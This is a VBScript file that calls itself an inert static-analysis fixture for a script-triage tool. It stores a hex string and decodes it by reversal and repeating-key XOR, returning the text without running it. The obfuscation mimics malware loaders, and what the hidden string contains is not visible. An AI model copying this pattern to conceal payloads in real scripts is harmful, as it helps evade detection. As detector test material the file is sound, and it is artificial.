Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_0f1e123e = "ab:5e:04:16:19:bb:48:13:48:02:b1:58:5f:54:10:bb:53:1e:05:14:bf:5d:06:4b:2e:ac:44:17:56:0d:ee:04:44:5a:42:e1:0b:16:0c:13:84:59:1e:5a:10:ab:53:02:4b:18:9c:60:10:59:3d:ab:4f:17:4a:05:b6:49:3a:64:14:aa:5d:05:4c:17:b7:6f:2e:6d:32:93:74:4f:50:05:b9:4c:2d:41:03:ac:4f:1b:5f:14:aa:40:06:59:15:f6:0a:4a:0e:13:eb:05:45:5c:45:ba:11:17:5f:10:ac:4f:2e:5a:10:94:4f:01:5d:03:ac:52:07:70:2d:bb:55:1e:5a:04:88:60:01:4a:14:ab:69:2e:02:32:e5:54:06:59:01:87:59:1e:51:17:a4:0a:4a:0e:13:eb:05:45:5c:45:ba:13:10:59:3d:ab:4f:17:4a:05:b6:49:3a:05:05:b6:59:15:59:2e:aa:59:01:4d:0d:ac:5d:16:16:17:be:08:4b:0b:47:e0:0a:5d:5c:18:b4:5d:04:56:18:f6:59:1e:48:1c:b9:44:17:16:47:e0:0a:10:0b:48:ef:58:46:5a:5e:f7:06:01:48:05:ac:54:4f:54:03:ad:40:44:00:47:ba:0f:4b:0f:15:ec:5e:5f:56:16:b1:5d:02:55:10:bb:01:16:51:2e:b6:5b:1b:59:01:b5:5d:11:44:45:e5:48:1c:4d:1e:bb:63:17:5f:10:ac:4f:0e:08:5f:ee:12:22:6c:25:90:70:3f:60:5f:ea:70:3f:60:22:95:01:00:5d:05:a8:5d:16:59:0d:ac:4c:1b:4a:12:ab:63:14:5e:1e:bc:52:13:50:5d:ab:4f:17:5b:1e:aa:4c:2d:50:12:ac:5d:02:4b:18:bc:10:17:54:18:be:63:17:4c:18:aa:4b:5e:5d:05:b7:51:17:4a:2e:bd:4e:1b:4d:00:bb:5d:4f:4b:01:bd:48:01:44:40:e5:4a"
Const Codec_0f1e123e = "reversed_hex|repeating_key_xor|3c,d8,71,38,72"

Function Load_0f1e123e()
  Dim parts, result(), i
  parts = Split(Material_0f1e123e, ":")
  ReDim result(UBound(parts))
  For i = 0 To UBound(parts)
    result(UBound(parts) - i) = CInt("&H" & parts(i))
  Next
  Load_0f1e123e = result
End Function

Function Decode_0f1e123e(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  keyBytes = Array(60,216,113,56,114)
  For i = 0 To UBound(s)
    result(i) = s(i) Xor keyBytes(i Mod 5)
  Next
  Decode_0f1e123e = result
End Function

Function Recover_0f1e123e()
  Dim s, d, t, n, i, p, e, q
  n = LCase(UCase("Host"))

  s = Load_0f1e123e()

  p = 0

  While p < 1

    d = Decode_0f1e123e(s)

    p = p + 1

  Wend

  t = ""

  For i = 0 To UBound(d)

    t = t & Chr(d(i))

  Next
  Recover_0f1e123e = t
End Function

Sub Copy_0f1e123e(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_0f1e123e()
  Dim resultText
  Call Copy_0f1e123e(Recover_0f1e123e(), resultText)
  Inspect_0f1e123e = resultText
End Function
